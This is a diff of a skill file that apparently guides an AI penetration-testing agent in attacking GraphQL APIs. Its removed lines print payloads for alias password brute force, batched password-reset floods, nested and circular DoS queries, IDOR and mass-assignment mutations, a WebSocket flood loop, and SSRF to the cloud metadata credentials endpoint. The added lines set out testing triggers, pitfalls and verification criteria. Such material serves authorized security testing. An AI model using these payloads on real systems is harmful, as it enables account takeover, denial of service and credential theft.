@@ -1,4 +1,4 @@
----
+﻿---
 name: graphql-attacks
 description: "GraphQL API exploitation including introspection abuse, batching attacks, alias brute force, and nested query DoS"
 category: specialized
@@ -65,12 +65,6 @@ GraphQL endpoints are not always at `/graphql`. Probe systematically.
 
 ### Discovery Technique
 
-```
-POST /graphql HTTP/1.1
-Content-Type: application/json
-
-{"query":"{ __typename }"}
-```
 
 **Expected responses:**
 - `"data":{"__typename":"Query"}` — confirmed GraphQL, introspection may be open
@@ -80,9 +74,6 @@ Content-Type: application/json
 - `405` — wrong method, try GET
 
 Also test with GET:
-```
-GET /graphql?query=%7B+__typename+%7D HTTP/1.1
-```
 
 If both GET and POST work, the server is likely Apollo Server or similar permissive implementation.
 
@@ -94,94 +85,6 @@ Introspection reveals the entire API surface — every type, field, mutation, ar
 
 ### Full Introspection Query
 
-```graphql
-query IntrospectionQuery {
-  __schema {
-    queryType { name }
-    mutationType { name }
-    subscriptionType { name }
-    types {
-      ...FullType
-    }
-    directives {
-      name
-      locations
-      args {
-        ...InputValue
-      }
-    }
-  }
-}
-
-fragment FullType on __Type {
-  kind
-  name
-  description
-  fields(includeDeprecated: true) {
-    name
-    description
-    args {
-      ...InputValue
-    }
-    type {
-      ...TypeRef
-    }
-    isDeprecated
-    deprecationReason
-  }
-  inputFields {
-    ...InputValue
-  }
-  interfaces {
-    ...TypeRef
-  }
-  enumValues(includeDeprecated: true) {
-    name
-    description
-    isDeprecated
-    deprecationReason
-  }
-  possibleTypes {
-    ...TypeRef
-  }
-}
-
-fragment InputValue on __InputValue {
-  name
-  description
-  type { ...TypeRef }
-  defaultValue
-}
-
-fragment TypeRef on __Type {
-  kind
-  name
-  ofType {
-    kind
-    name
-    ofType {
-      kind
-      name
-      ofType {
-        kind
-        name
-        ofType {
-          kind
-          name
-          ofType {
-            kind
-            name
-            ofType {
-              kind
-              name
-            }
-          }
-        }
-      }
-    }
-  }
-}
-```
 
 ### Schema Extraction — What to Look For
 
@@ -218,16 +121,6 @@ If introspection queries return `"Introspection has been disabled"` or errors, u
 
 Send intentionally malformed queries to extract field names from error messages:
 
-```graphql
-query { nonexistentField }
-# Error: Cannot query field "nonexistentField" on type "Query". Did you mean "users", "me", "admin"?
-
-query { user(id: 1) { nonexistentField } }
-# Error: Cannot query field "nonexistentField" on type "User". Did you mean "name", "email", "role"?
-
-query { user(name: "test") }
-# Error: Field "user" doesn't accept argument "name". Did you mean "id" or "email"?
-```
 
 Each error leaks field names, types, and argument names. Iterate until you have a complete map of the visible schema.
 
@@ -235,14 +128,6 @@ Each error leaks field names, types, and argument names. Iterate until you have 
 
 `__typename` is always available even when introspection is disabled:
 
-```graphql
-query { me { __typename } }
-# "User"
-
-query { me { role { __typename } } }
-# If role is an object type: "Role"
-# If role is a scalar: error (means it's a string/enum, not a nested type)
-```
 
 Use `__typename` to determine the structure of nested types without full introspection.
 
@@ -250,13 +135,6 @@ Use `__typename` to determine the structure of nested types without full introsp
 
 GraphQL servers often return helpful suggestions when fields are close to valid names:
 
-```graphql
-query { userz }
-# Error: Cannot query field "userz" on type "Query". Did you mean "users", "user"?
-
-query { admn }
-# Error: ... Did you mean "admin"?
-```
 
 Systematically try misspellings of common field names to map the schema via suggestions.
 
@@ -264,9 +142,6 @@ Systematically try misspellings of common field names to map the schema via sugg
 
 If the server uses Apollo or similar, try the `apollo-federation` header:
 
-```
-Apollo-Require-Preflight: true
-```
 
 Or try sending `{"extensions":{"tracing":true}}` in the request — some servers expose the full query plan in tracing extensions even when introspection is disabled.
 
@@ -278,15 +153,6 @@ GraphQL allows sending multiple operations in a single HTTP request as a JSON ar
 
 ### Basic Batching
 
-```json
-[
-  {"query":"query { user(id:1) { email } }"},
-  {"query":"query { user(id:2) { email } }"},
-  {"query":"query { user(id:3) { email } }"},
-  {"query":"query { user(id:4) { email } }"},
-  {"query":"query { user(id:5) { email } }"}
-]
-```
 
 If rate limiting is per-request (not per-operation), this allows 5x the normal request volume.
 
@@ -294,27 +160,11 @@ If rate limiting is per-request (not per-operation), this allows 5x the normal r
 
 Use batching to enumerate IDs faster:
 
-```json
-[
-  {"query":"query($id:ID!){user(id:$id){id email}}","variables":{"id":"1"}},
-  {"query":"query($id:ID!){user(id:$id){id email}}","variables":{"id":"2"}},
-  {"query":"query($id:ID!){user(id:$id){id email}}","variables":{"id":"3"}},
-  {"query":"query($id:ID!){user(id:$id){id email}}","variables":{"id":"100"}},
-  {"query":"query($id:ID!){user(id:$id){id email}}","variables":{"id":"101"}}
-]
-```
 
 ### Batch Mutation Abuse
 
 If mutations are not rate-limited per-operation:
 
-```json
-[
-  {"query":"mutation{resetPassword(email:\"admin@example.com\"){success}}"},
-  {"query":"mutation{resetPassword(email:\"user@example.com\"){success}}"},
-  {"query":"mutation{resetPassword(email:\"ceo@example.com\"){success}}"}
-]
-```
 
 This sends N password reset requests in a single HTTP call.
 
@@ -332,30 +182,6 @@ Aliases let you send multiple calls to the same resolver in one query, each with
 
 ### Basic Alias Brute Force
 
-```graphql
-query {
-  alias0: login(email: "admin@example.com", password: "password123") {
-    token
-    user { role }
-  }
-  alias1: login(email: "admin@example.com", password: "letmein") {
-    token
-    user { role }
-  }
-  alias2: login(email: "admin@example.com", password: "admin123") {
-    token
-    user { role }
-  }
-  alias3: login(email: "admin@example.com", password: "qwerty") {
-    token
-    user { role }
-  }
-  alias4: login(email: "admin@example.com", password: "123456") {
-    token
-    user { role }
-  }
-}
-```
 
 ### Detecting Valid Credentials
 
@@ -368,27 +194,11 @@ query {
 
 Combine user enumeration with password guessing:
 
-```graphql
-query {
-  a1: login(email: "admin@example.com", password: "admin") { token }
-  a2: login(email: "admin@corp.com", password: "admin") { token }
-  a3: login(email: "root@example.com", password: "admin") { token }
-  a4: login(email: "test@example.com", password: "admin") { token }
-  a5: login(email: "user@example.com", password: "admin") { token }
-}
-```
 
 ### Limit Bypass
 
 Many GraphQL servers limit aliases to 10-50 per query. Test the actual limit:
 
-```graphql
-query {
-  # Generate aliases programmatically
-  a0: user(id:1){id} a1: user(id:2){id} a2: user(id:3){id}
-  # ... continue until server rejects
-}
-```
 
 The server may accept 10 aliases but reject 100. Find the boundary and batch accordingly.
 
@@ -400,26 +210,6 @@ GraphQL allows deeply nested queries that can exhaust server CPU and memory. Thi
 
 ### Basic Nested Query
 
-```graphql
-query {
-  users {
-    friends {
-      friends {
-        friends {
-          friends {
-            friends {
-              friends {
-                name
-                email
-              }
-            }
-          }
-        }
-      }
-    }
-  }
-}
-```
 
 If the `friends` field is a self-referential relationship, each level multiplies the result set. At depth 6 with 100 users each having 10 friends, this returns 100 * 10^6 = 100 million objects.
 
@@ -427,23 +217,6 @@ If the `friends` field is a self-referential relationship, each level multiplies
 
 Some servers do not detect circular references when using fragments:
 
-```graphql
-query {
-  ...A
-}
-
-fragment A on User {
-  friends {
-    ...B
-  }
-}
-
-fragment B on User {
-  friends {
-    ...A
-  }
-}
-```
 
 This creates an infinite loop. If the server does not limit fragment depth, it crashes or hangs.
 
@@ -451,39 +224,11 @@ This creates an infinite loop. If the server does not limit fragment depth, it c
 
 Combine fields known to be expensive:
 
-```graphql
-query {
-  posts {
-    author {
-      posts {
-        comments {
-          author {
-            posts {
-              comments {
-                author {
-                  name
-                }
-              }
-            }
-          }
-        }
-      }
-    }
-  }
-}
-```
 
 ### Batch + Nested DoS
 
 Combine batching with nesting for amplified effect:
 
-```json
-[
-  {"query":"query{users{friends{friends{friends{name}}}}}"},
-  {"query":"query{posts{author{posts{author{posts{name}}}}}"},
-  {"query":"query{comments{author{comments{author{comments{body}}}}}}"}
-]
-```
 
 ### Defense Signals
 
@@ -500,15 +245,6 @@ Mutations change server state. Every mutation is a potential attack surface.
 
 ### IDOR via Mutations
 
-```graphql
-mutation {
-  updateUser(id: "other-user-id", input: { email: "attacker@evil.com" }) {
-    id
-    email
-    role
-  }
-}
-```
 
 Test with:
 - Sequential IDs: `1`, `2`, `3`...
@@ -519,22 +255,6 @@ Test with:
 
 GraphQL mutations often accept input objects. If the server does not whitelist allowed fields:
 
-```graphql
-mutation {
-  updateProfile(input: {
-    name: "Normal User",
-    email: "user@example.com",
-    role: "ADMIN",
-    isAdmin: true,
-    permissions: ["read", "write", "delete", "admin"],
-    salary: 999999
-  }) {
-    id
-    role
-    isAdmin
-  }
-}
-```
 
 The server may silently accept fields it should not expose in the mutation input.
 
@@ -542,28 +262,6 @@ The server may silently accept fields it should not expose in the mutation input
 
 Test if mutations enforce the same authorization as queries:
 
-```graphql
-# Can a regular user call admin-only mutations?
-mutation {
-  deleteUser(id: "admin-id") {
-    success
-  }
-}
-
-# Can an unauthenticated user call mutations?
-mutation {
-  createPost(input: { title: "Hacked", body: "..." }) {
-    id
-  }
-}
-
-# Can a user mutate other users' data?
-mutation {
-  updateOrder(orderId: "别人的订单id", input: { status: "REFUNDED" }) {
-    status
-  }
-}
-```
 
 ### Mutation Error Analysis
 
@@ -584,22 +282,11 @@ GraphQL subscriptions use WebSocket connections for real-time data. They are oft
 
 Look for WebSocket upgrade requests in network traffic:
 
-```
-ws://target.com/graphql?token=eyJ...
-wss://target.com/graphql
-ws://target.com/subscriptions
-```
 
 ### Subscription DoS
 
 Open many WebSocket connections to exhaust server resources:
 
-```javascript
-// Pseudocode — do not execute blindly, this is a conceptual attack
-for (let i = 0; i < 1000; i++) {
-  new WebSocket('wss://target.com/graphql', 'graphql-ws');
-}
-```
 
 Each connection holds server memory and potentially a database subscription. Servers with limited connection pools will reject legitimate users.
 
@@ -607,17 +294,6 @@ Each connection holds server memory and potentially a database subscription. Ser
 
 If subscriptions are not authorization-gated per-field:
 
-```graphql
-subscription {
-  onUserUpdate {
-    id
-    email
-    role
-    lastLoginIp
-    sessionToken
-  }
-}
-```
 
 Subscribe to high-sensitivity events. Even if queries restrict these fields, subscriptions may return them.
 
@@ -643,14 +319,6 @@ Introspection may reveal `@deprecated(reason: "See https://internal-api.corp.loc
 
 If the schema has a `Upload` scalar or file upload mutation:
 
-```graphql
-mutation($file: Upload!) {
-  importData(file: $file) {
-    id
-    status
-  }
-}
-```
 
 Upload a file containing:
 - Internal URLs for SSRF: `http://169.254.169.254/latest/meta-data/` (cloud metadata)
@@ -661,23 +329,11 @@ Upload a file containing:
 
 Custom scalars may accept URLs or connection strings:
 
-```graphql
-query {
-  fetchUrl(url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/") {
-    data
-  }
-}
-```
 
 ### Directive Arguments
 
 Some GraphQL servers support custom directives that accept URLs:
 
-```graphql
-query @cache(url: "http://internal-service:8080/admin") {
-  sensitiveData
-}
-```
 
 ---
 
@@ -700,3 +356,24 @@ Do not hallucinate server-side protections. If you did not test rate limiting, d
 When a technique fails, record exactly what the server responded with. The error message itself is evidence of the server's implementation.
 
 Save all raw responses with `recordEvidence` before drawing conclusions.
+
+## Trigger Conditions
+
+Activate when a GraphQL surface exists or is suspected — `/graphql`, `/gql`, `/query`, `application/graphql`, request bodies with a `query` field, or subscription WebSockets. Trigger for schema/introspection exposure, batching/alias abuse (rate-limit/credential stuffing), nested-query DoS, IDOR/mass-assignment via mutations, and GraphQL-specific SSRF. Do not trigger on pure REST/SOAP/gRPC/SSE-with-no-GraphQL; respect explicit scope excluding API abuse.
+
+## Detection Approach
+
+First confirm the endpoint (introspection probe; note `405`→try GET, error shapes that reveal existence). If introspection is open, extract the full schema and prioritize mutations, sensitive queries (`me`, `admin`), enums (roles), and input types (hidden `role`/`isAdmin`). If disabled, reconstruct via error messages, `__typename` probing, and field suggestions. For batching/alias abuse, send arrays of operations/aliases to a single HTTP request and compare response vs per-request limits — confirm it actually bypasses counting. For nested-query DoS, send deep self-referential queries and observe depth/timeout/size defenses (measure response time scaling). For mutations, test IDOR (swap IDs), mass assignment (add fields), and authz parity with queries. Always confirm with the actual response — don't speculate on field returns.
+
+## Pitfalls
+
+- Claiming introspection enabled without the schema/`__typename` response.
+- Claiming batching bypasses rate limiting without comparing batch vs single behavior.
+- Claiming credentials found without a successful auth token/response.
+- Assuming a mutation accepts unauthorized input without the mutation response.
+- Speculating field returns from names alone — error messages/introspection are the only evidence.
+- Hallucinating server-side protections (depth limits, rate caps) you didn't actually test.
+
+## Verification & Impact
+
+CONFIRMED when evidence shows: full introspection schema returned (info disclosure), batch/alias volume exceeding per-operation limits, a successful credential-stuffing token, a nested query causing measurable resource exhaustion/timeout, or a mutation accepting unauthorized input/ID. SUSPECTED when a technique is attempted but impact isn't reproduced — record as candidate. Document impact by class (introspection info-leak, auth bypass, DoS, SSRF via schema URLs/uploads) and severity. Capture raw queries/responses via `recordEvidence`.
